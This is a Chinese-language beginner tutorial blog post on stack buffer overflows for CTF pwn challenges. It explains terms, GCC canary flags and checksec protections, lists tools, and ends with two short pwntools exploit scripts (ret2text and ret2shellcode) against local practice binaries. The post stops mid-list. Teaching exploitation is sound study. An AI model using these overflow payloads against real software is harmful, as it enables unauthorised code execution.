---
layout: post
title: 栈溢出基础
subtitle: "基础内容"
author: "bo"
header-img: "img/post-bg-halting.jpg"
header-mask: 0.3
---
### 基础知识和基本工具
#### 1. 基本名词
>    1. **poc** (proof of concept)：漏洞概念证明。
>    2. **vul** (vulnerable) ：漏洞
>    3. **exp** (exploit)：漏洞利用
>    4. **ELF** (Executable and Linkable Format)： 可执行和可链接的格式，它是关于可执行文件，对象代码，共享库和内核导出的一种公共标准文件，由三个部分组成，program head table，section head table，data referred to above;
>5. **PIC**(position-independent code)：位置无关代码。PIC是可以在主存中不同位置执行的目标代码。PIC经常被用在共享库中，这样就能将相同的库代码为每个程序映射到一个位置，不用担心覆盖掉其他程序或共享库。
   >6. **PIE**(position-independent executable)位置无关可执行程序。它有一个显著的优点，那就是当程序加载时，所有PIE二进制文件以及它所有的依赖都会加载到虚拟内存空间中的随机位置（随机地址），可以有效提高他人通过绝对地址实施"return-to-libc"安全攻击的难度。
   >7. **GOT**(global offset table):全局偏移量表
   >8. PLT(procedure linkage table):过程链接表;
 >9. 栈溢出四种方式  
     > 1.**shellcode**  
     > 2.**return** **into**   **libc**  
     > 3.**return** **oriented**  **programming**  
     > 4.**Hijack Got**  
>10. a
#### 2. 基本防御机制
   1. **Canary**:
   往栈溢出高危区域尾部插入一个值，来判断溢出是否发生。
   
   >可以在 GCC 中使用以下参数设置 Canary:

```
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector 禁用保护.
```
其stack结构大致如下

            High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | 局部变量        |
        Low     |                 |
        Address
具体实现及绕过方式，点击查看[Canary](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/)

其他安全机制[Windows和linux内存防护机制](https://blog.csdn.net/x_nirvana/article/details/61420056)
#### 3. 常用工具
   1. gdb ： Linux上的基本调试工具。
   2. gdb-peda：用于加强gdb功能，gef和gdbinit与其类似。
   3. pwntools：是一个ctf框架和漏洞利用开发库。
   4. checksec 一个脚本软件，用于检查可执行文件属性.   
      1. RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表 
      2. Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过 
      3. NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过 
      4. PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 
      5. FORTIFY：FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。
   5. objdump和readelf:可以很快的知道elf文件关键信息；   
   6. ida pro :反编译工具；   
   7. ROPgadget: 强大的的rop利用工具
   8. one_gadget:可以快速的寻找libc中的调用exec(‘bin/sh’)的位置 ;
   9.  libc-database： 可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本 
   

#### 4. 简单实战入门

1. 首先是一个签到题   
    1. 用gdb打开，然后 检查他保护
图1
     2. 之后用idb打开。
图2
发现中间有一个gets函数，没有限制长度，所以去文件里面，查找，发现一个函数里面调用了system函数，那就记录这个地址。
图3
     3. 之后再在gets函数这里下断点，计算出esp和ebp之间的距离再加上4，就是需要覆盖的返回地址了。结果是112
     4. 最后写出 exploit
```python
from pwn import *
shell = process('./ret2text')
target = 0x804863a
payload = 'A'*112 + p32(target)
shell.sendline(payload)
shell.interactive()



```
2. ret2shellcode
   这个略过，注意 vmmap gdb插件命令，能查看相应段的执行权限，直接上代码
```python
from pwn import *
shell = process('./ret2shellcode')
target = 0x0804A080
payload = asm(shellcraft.sh()).ljust(112,'A') + p32(target)
shell.sendline(payload)
shell.interactive()
```
3. 